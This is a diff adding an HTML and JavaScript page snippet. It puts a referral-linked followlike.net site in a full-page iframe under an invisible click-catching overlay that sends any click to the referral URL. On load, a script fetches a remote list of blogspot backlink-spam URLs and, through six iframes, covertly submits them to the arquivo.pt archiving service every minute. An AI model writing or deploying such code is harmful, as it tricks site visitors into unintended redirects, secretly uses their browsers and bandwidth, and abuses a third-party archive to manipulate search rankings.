@@ -1,0 +1,210 @@
+<link href='https://trafficgenerator.github.io/api/custom-frame-styles.css' rel='stylesheet'/>
+
+<div id="container">
+<iframe id="fullIframe" src="https://www.followlike.net/?r=19384926"></iframe>
+<div id="clickCatcher"></div>
+</div>
+
+<script>
+      document.getElementById("clickCatcher").addEventListener("click", function () {
+        window.location.href = "https://www.followlike.net/?r=19384926";
+      });
+</script>
+
+<!----------------------------------------------------------------------------------------->
+
+<div id="iframeContainer"></div>
+
+<script type="text/javascript">
+//<![CDATA[
+const mainURLs = [
+"https://smartbacklinkmaker.blogspot.com/",
+        "https://backlinkautogen.blogspot.com/",
+        "https://seobacklinkbuildertool.blogspot.com/",
+        "https://backlinkcreatorx.blogspot.com/",
+        "https://freebacklinkwizard.blogspot.com/",
+        "https://smartbacklinktools.blogspot.com/",
+        "https://autobacklinkgen.blogspot.com/",
+        "https://instantlinkmaker.blogspot.com/",
+        "https://mybacklinkbuilder.blogspot.com/",
+        "https://backlinkprotool.blogspot.com/",
+        "https://smartbacklinkbuilder.blogspot.com/",
+        "https://freelinkbuildertool.blogspot.com/",
+        "https://backlinkboosterfree.blogspot.com/",
+        "https://easybacklinkgenerator.blogspot.com/",
+        "https://onlinebacklinkcreator.blogspot.com/",
+        "https://freebacklinkgeneratorpro.blogspot.com/",
+        "https://turbobacklinkmaker.blogspot.com/",
+        "https://backlinkfactoryonline.blogspot.com/",
+        "https://backlinkboosttool.blogspot.com/",
+        "https://powerbacklinkmaker.blogspot.com/",
+        "https://quickbacklinkcreator.blogspot.com/",
+        "https://backlinkgeneratorhub.blogspot.com/",
+        "https://backlinktoolbox.blogspot.com/",
+        "https://backlinkmakerhub.blogspot.com/",
+        "https://instantbacklinkgenerator.blogspot.com/",
+        "https://freelinkbuilderlab.blogspot.com/",
+        "https://backlinkninjatool.blogspot.com/",
+        "https://generatorbacklinks.blogspot.com/",
+        "https://freebacklinkgeneratorblog.blogspot.com/",
+        "https://quickbacklinkmaker.blogspot.com/",
+        "https://backlinksmiths.blogspot.com/",
+        "https://mybacklinkgenerator.blogspot.com/",
+        "https://autobacklinkmaker.blogspot.com/",
+        "https://trustedbacklinkmaker.blogspot.com/",
+        "https://backlinktoolboxonline.blogspot.com/",
+        "https://backlinklabtools.blogspot.com/",
+        "https://rapidbacklinkbuilder.blogspot.com/",
+        "https://backlinkforgeonline.blogspot.com/",
+        "https://ultimatebacklinkgenerator.blogspot.com/",
+        "https://backlinkbuilderpro.blogspot.com/",
+        "https://backlinktoolboxfree.blogspot.com/",
+        "https://backlinkgeneratorlab.blogspot.com/",
+        "https://backlinkwizardfree.blogspot.com/",
+        "https://backlinkgenpro.blogspot.com/",
+        "https://buildmybacklinks.blogspot.com/",
+        "https://backlinkmakernet.blogspot.com/",
+        "https://backlinkbuilderlab.blogspot.com/",
+        "https://ultimatebacklinkmaker.blogspot.com/",
+        "https://freebacklinkmakeronline.blogspot.com/",
+        "https://superbacklinkmaker.blogspot.com/",
+        "https://simplebacklinkmaker.blogspot.com/",
+        "https://seo-backlinkgenerator.blogspot.com/",
+        "https://unlimitedbacklinkgenerator.blogspot.com/",
+        "https://powerfulbacklinkgenerator.blogspot.com/",
+        "https://instantseo-backlinks.blogspot.com/",
+        "https://automaticbacklinkgenerator.blogspot.com/",
+        "https://onlinebacklinkbuilder.blogspot.com/",
+        "https://seo-backlinktool.blogspot.com/",
+        "https://linkboostgenerator.blogspot.com/",
+        "https://probacklinktool.blogspot.com/",
+        "https://rankbacklinkmaker.blogspot.com/",
+        "https://backlinkhero.blogspot.com/",
+        "https://freeoneclickbacklink.blogspot.com/",
+        "https://powerbacklinkbuilder.blogspot.com/",
+        "https://smartlinkcreator.blogspot.com/",
+        "https://freebacklinktoolonline.blogspot.com/",
+        "https://freelinkgeneratortool.blogspot.com/",
+        "https://backlinkcreatorpro.blogspot.com/",
+        "https://autoseogenerator.blogspot.com/",
+        "https://backlinkbuilderonline.blogspot.com/",
+        "https://autobacklinkcreator.blogspot.com/",
+        "https://backlinkmakeronline.blogspot.com/",
+        "https://freeseobacklinkmaker.blogspot.com/",
+        "https://backlinkcreator360.blogspot.com/",
+        "https://megabacklinktool.blogspot.com/"
+];
+  
+
+const fetchURLs = [
+  	"https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/blogger-domains.json"
+];
+
+function shuffle(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+    }
+}
+
+async function updateDefaultURLs() {
+    shuffle(fetchURLs);
+
+    for (const url of fetchURLs) {
+        try {
+            const response = await fetch(url);
+            if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+            const data = await response.json();
+
+            if (Array.isArray(data)) {
+                if (data.length > 0) {
+                    console.log("✅ Successfully loaded new URLs from:", url);
+                    
+                    // Replace contents of defaultURLs
+                    mainURLs.length = 0;
+                    mainURLs.push(...data);
+
+                    return;
+                } else {
+                    console.warn(`⚠️ Loaded from ${url}, but received empty array. Skipping...`);
+                }
+            } else {
+                console.warn(`⚠️ Loaded from ${url}, but response is not a valid array. Skipping...`);
+            }
+        } catch (error) {
+            console.warn(`⚠️ Failed to load from ${url}:`, error.message);
+        }
+    }
+
+    console.log("⚠️ All fetch attempts failed or returned empty. Using default defaultURLs.");
+}
+
+function randomURL(array) {
+    const index = Math.floor(Math.random() * array.length);
+    return array[index];
+}
+
+function getRandomURLs() {
+    const url = randomURL(mainURLs);
+    return url;
+}
+
+function extractDomain(url) {
+    try {
+        const a = document.createElement('a');
+        a.href = url;
+        return a.hostname;
+    } catch {
+        return url;
+    }
+}
+
+function archiveWebsite(url, target = "") {
+    const form = document.createElement('form');
+    form.action = "https://arquivo.pt/services/archivepagenow?l=pt";
+    form.method = "POST";
+    form.target = target;
+    form.style.display = "none";
+	
+    const input = document.createElement('input');
+    input.type = "text";
+    input.name = "url";
+    input.value = url;
+
+    form.appendChild(input);
+    document.body.appendChild(form);
+    form.submit();
+    form.remove();
+}
+
+async function main() {
+    await updateDefaultURLs(); // ⏳ wait for URLs to load first
+  	
+    const iframeContainer = document.getElementById("iframeContainer");
+	
+    // Create 6 hidden iframes and archive automatically
+    for (let i = 0; i < 6; i++) {
+        const iframe = document.createElement("iframe");
+        iframe.name = "hiddenFrame" + i;
+        iframe.classList.add("hidden-iframe");
+        iframe.style.width = "100%";
+        iframe.style.height = "300px";
+        //iframe.style.display = "none";
+
+        iframeContainer.appendChild(iframe);
+
+        const randomURL = getRandomURLs();
+        archiveWebsite(randomURL, iframe.name);
+
+        setInterval(() => {
+            const randomURL = getRandomURLs();
+            archiveWebsite(randomURL, iframe.name);
+        }, (60000));
+    }
+}
+
+// 🚀 Run when page loads
+main();
+
+//]]>
+</script>
